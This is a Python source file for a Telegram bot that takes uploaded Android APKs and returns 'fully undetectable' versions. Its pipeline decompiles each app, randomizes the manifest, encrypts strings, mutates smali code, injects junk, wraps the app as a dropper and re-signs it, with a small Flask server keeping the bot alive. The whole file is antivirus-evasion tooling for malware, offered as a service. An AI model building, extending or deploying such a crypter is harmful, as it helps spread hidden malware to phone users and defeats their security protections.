import os
import asyncio
import uuid
import shutil
from flask import Flask
import threading
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes

from apktool_wrapper import decompile, recompile
from dex_mutator import mutate_smali
from encryptor import encrypt_strings
from manifest import randomize_manifest
from junk_injector import inject_junk
from dropper import wrap_as_dropper
from signer import sign_apk
from config import BOT_TOKEN, WORK_DIR

def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    decompiled_dir = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled_dir)
    randomize_manifest(decompiled_dir)
    encrypt_strings(decompiled_dir)
    mutate_smali(decompiled_dir)
    inject_junk(decompiled_dir)
    unsigned_apk = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled_dir, unsigned_apk)
    dropped_apk = os.path.join(session_dir, "dropped.apk")
    wrap_as_dropper(unsigned_apk, dropped_apk, session_dir)
    sign_apk(dropped_apk, output_apk)
    return output_apk

flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "FUD Bot is alive! 🤖"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host='0.0.0.0', port=port)

def start_flask():
    threading.Thread(target=run_flask).start()

async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.endswith(".apk"):
        await update.message.reply_text("Send an APK file only.")
        return
    session_id = str(uuid.uuid4())[:8]
    session_dir = os.path.join(WORK_DIR, session_id)
    os.makedirs(session_dir, exist_ok=True)
    input_path = os.path.join(session_dir, "input.apk")
    output_path = os.path.join(session_dir, "fud_output.apk")
    await update.message.reply_text("⚙️ Processing your APK...")
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive(input_path)
    try:
        result_path = await asyncio.to_thread(full_fud_pipeline, input_path, output_path, session_dir)
        await update.message.reply_document(document=open(result_path, "rb"), filename="fud_ready.apk")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")
    finally:
        shutil.rmtree(session_dir, ignore_errors=True)

def main():
    os.makedirs(WORK_DIR, exist_ok=True)
    start_flask()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
    print("🤖 FUD Bot is live on Telegram...")
    app.run_polling()

if __name__ == "__main__":
    main()
